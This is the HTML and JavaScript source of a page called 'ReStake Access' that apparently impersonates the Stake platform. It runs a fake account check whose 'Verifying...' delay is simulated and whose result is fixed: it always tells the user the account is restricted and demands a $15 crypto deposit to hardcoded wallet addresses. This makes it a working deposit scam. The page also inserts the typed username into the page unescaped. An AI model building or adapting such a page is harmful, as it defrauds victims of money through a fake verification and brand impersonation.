<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReStake Access</title>
    <style>
        /* Simple style for the page */
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }

        /* Style for the button */
        #verifyBtn {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }

        /* Loading animation */
        #loadingAnimation {
            display: none;
            margin-top: 20px;
        }

        /* Message Style */
        #verificationMessage {
            margin-top: 20px;
            font-size: 18px;
            color: green;
        }

        /* Spinner animation */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
        }

        /* Dropdown for selecting crypto addresses */
        select, option {
            padding: 10px;
            font-size: 16px;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <!-- Username Input and Verify Button -->
    <input type="text" id="username" placeholder="Enter your username" style="padding: 10px; font-size: 16px;">
    
    <!-- Dropdown for selecting cryptocurrency -->
    <select id="cryptoSelect">
        <option value="USDT_TRC20">USDT - TRC20</option>
        <option value="USDT_BSC">USDT - BSC</option>
        <option value="BTC_BSC">BTC - BSC</option>
        <option value="TRX_TRC20">TRX - TRC20</option>
        <option value="TRX_BSC">TRX - BSC</option>
        <option value="ETH_BSC">Ethereum - BSC</option>
    </select>

    <button id="verifyBtn" onclick="verifyAccount()">Verify</button>

    <!-- Loading Animation -->
    <div id="loadingAnimation">
        <p>Verifying...</p>
        <div class="loader"></div>
    </div>

    <!-- Verification Message -->
    <div id="verificationMessage"></div>

    <script>
        // Crypto Addresses and Networks
        const cryptoAddresses = {
            "USDT_TRC20": "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
            "USDT_BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
            "BTC_BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
            "TRX_TRC20": "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
            "TRX_BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
            "ETH_BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c"
        };

        // Function to verify account
        function verifyAccount() {
            const username = document.getElementById("username").value;
            const selectedCrypto = document.getElementById("cryptoSelect").value;
            const address = cryptoAddresses[selectedCrypto];

            // Show loading animation
            document.getElementById("loadingAnimation").style.display = "block";
            document.getElementById("verifyBtn").disabled = true;

            // Simulate a delay of 1-2 seconds for verification
            setTimeout(function() {
                document.getElementById("loadingAnimation").style.display = "none"; // Hide loading animation
                displayVerificationMessage(username, address, selectedCrypto); // Show verification message
            }, 2000); // 2 seconds delay
        }

        // Display the verification message
        function displayVerificationMessage(username, address, selectedCrypto) {
            document.getElementById("verificationMessage").innerHTML = `
                <strong>Account for Username:</strong> ${username} <br>
                <strong>Selected Address:</strong> ${address} <br>
                <strong>Network:</strong> ${selectedCrypto.split('_')[1]} <br><br>
                Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.
            `;
        }
    </script>

</body>
</html>
